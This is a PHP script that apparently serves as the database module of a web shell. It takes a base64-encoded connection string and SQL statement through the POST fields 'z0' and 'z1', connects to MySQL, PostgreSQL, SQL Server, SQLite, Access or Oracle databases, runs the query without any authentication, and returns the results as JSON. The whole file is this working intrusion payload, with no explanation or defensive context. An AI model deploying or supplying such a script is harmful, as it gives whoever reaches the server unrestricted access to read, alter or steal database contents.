<?php

/*
Example:
    mysql://user:password@host:port/database
    pgsql://user:password@host:port/database
    sqlsrv://user:password@host:port/database
    sqlite://D:/data/test.sqlite
    access://D:/data/test.accdb;Password=123456
    oracle://username:password@host:port/service_name
*/

header('Content-Type: application/json');

$dsn_url = isset($_POST['z0']) ? base64_decode($_POST['z0']) : '';
$sql     = isset($_POST['z1']) ? base64_decode($_POST['z1']) : '';

function parse_server_dsn($url)
{
    $p = parse_url($url);

    if (!$p || !isset($p['scheme']))
    {
        throw new Exception('Invalid DSN format');
    }

    return array(
        'driver'   => strtolower($p['scheme']),
        'host'     => isset($p['host']) ? $p['host'] : '',
        'port'     => isset($p['port']) ? $p['port'] : '',
        'database' => isset($p['path']) ? ltrim($p['path'], '/') : '',
        'user'     => isset($p['user']) ? $p['user'] : '',
        'password' => isset($p['pass']) ? $p['pass'] : ''
    );
}

function parse_file_dsn($url)
{
    $content = substr($url, strpos($url, '://') + 3);

    $parts = explode(';', $content);
    $path = array_shift($parts);

    $options = array();

    foreach ($parts as $item)
    {
        if (strpos($item, '=') !== false)
        {
            list($k, $v) = explode('=', $item, 2);

            $options[trim($k)] = trim($v);
        }
    }

    return array(
        'database' => $path,
        'password' => isset($options['Password'])
            ? $options['Password']
            : (isset($options['PWD']) ? $options['PWD'] : '')
    );
}

function create_pdo($url)
{
    $driver = strtolower(strtok($url, ':'));

    switch ($driver)
    {
        case 'mysql':

            if (!extension_loaded('pdo_mysql'))
            {
                throw new Exception('Missing PDO driver: mysql');
            }

            $cfg = parse_server_dsn($url);

            $dsn =
                'mysql:' .
                'host=' . $cfg['host'] . ';' .
                'port=' . $cfg['port'] . ';' .
                'dbname=' . $cfg['database'] . ';' .
                'charset=utf8mb4';

            return new PDO(
                $dsn,
                $cfg['user'],
                $cfg['password']
            );

        case 'pgsql':

            if (!extension_loaded('pdo_pgsql'))
            {
                throw new Exception('Missing PDO driver: pgsql');
            }

            $cfg = parse_server_dsn($url);

            $dsn =
                'pgsql:' .
                'host=' . $cfg['host'] . ';' .
                'port=' . $cfg['port'] . ';' .
                'dbname=' . $cfg['database'];

            return new PDO(
                $dsn,
                $cfg['user'],
                $cfg['password']
            );

        case 'sqlsrv':

            if (!extension_loaded('pdo_sqlsrv'))
            {
                throw new Exception('Missing PDO driver: sqlsrv');
            }

            $cfg = parse_server_dsn($url);

            $dsn =
                'sqlsrv:' .
                'Server=' . $cfg['host'] .
                ($cfg['port'] ? ',' . $cfg['port'] : '') .
                ';Database=' . $cfg['database'];

            return new PDO(
                $dsn,
                $cfg['user'],
                $cfg['password']
            );

        case 'sqlite':

            if (!extension_loaded('pdo_sqlite'))
            {
                throw new Exception('Missing PDO driver: sqlite');
            }

            $path = substr($url, 9);

            if (!file_exists($path))
            {
                throw new Exception(
                    'SQLite file not found: ' . $path
                );
            }

            return new PDO('sqlite:' . $path);

        case 'access':

            if (!extension_loaded('pdo_odbc'))
            {
                throw new Exception('Missing PDO driver: odbc');
            }

            $cfg = parse_file_dsn($url);

            if (!file_exists($cfg['database']))
            {
                throw new Exception(
                    'Access file not found: ' . $cfg['database']
                );
            }

            $dsn =
                'odbc:' .
                'Driver={Microsoft Access Driver (*.mdb, *.accdb)};' .
                'Dbq=' . $cfg['database'] . ';';

            if ($cfg['password'] !== '')
            {
                $dsn .= 'PWD=' . $cfg['password'] . ';';
            }

            return new PDO($dsn);

        case 'oracle':

            if (!extension_loaded('pdo_oci'))
            {
                throw new Exception('Missing PDO driver: oracle');
            }

            $cfg = parse_server_dsn($url);

            $dsn =
                'oci:' .
                'dbname=//' .
                $cfg['host'] .
                ':' .
                $cfg['port'] .
                '/' .
                $cfg['database'];

            return new PDO(
                $dsn,
                $cfg['user'],
                $cfg['password']
            );

        default:

            throw new Exception(
                'Unsupported database type: ' . $driver
            );
    }
}

try
{
    $pdo = create_pdo($dsn_url);

    $pdo->setAttribute(
        PDO::ATTR_ERRMODE,
        PDO::ERRMODE_EXCEPTION
    );

    if (!$sql)
    {
        echo json_encode(
            array(
                'success' => true,
                'message' => 'Database connection is OK'
            )
        );

        exit;
    }

    $stmt = $pdo->query($sql);

    $rows = array();

    if ($stmt->columnCount() > 0)
    {
        while ($row = $stmt->fetch(PDO::FETCH_ASSOC))
        {
            $rows[] = $row;
        }

        echo json_encode(
            array(
                'success' => true,
                'rowCount' => count($rows),
                'data' => $rows
            )
        );
    }
    else
    {
        echo json_encode(
            array(
                'success' => true,
                'rowCount' => $stmt->rowCount(),
                'data' => array()
            )
        );
    }

    $pdo = null;
}
catch (Exception $e)
{
    echo json_encode(
        array(
            'success' => false,
            'error' => $e->getMessage()
        )
    );
}

?>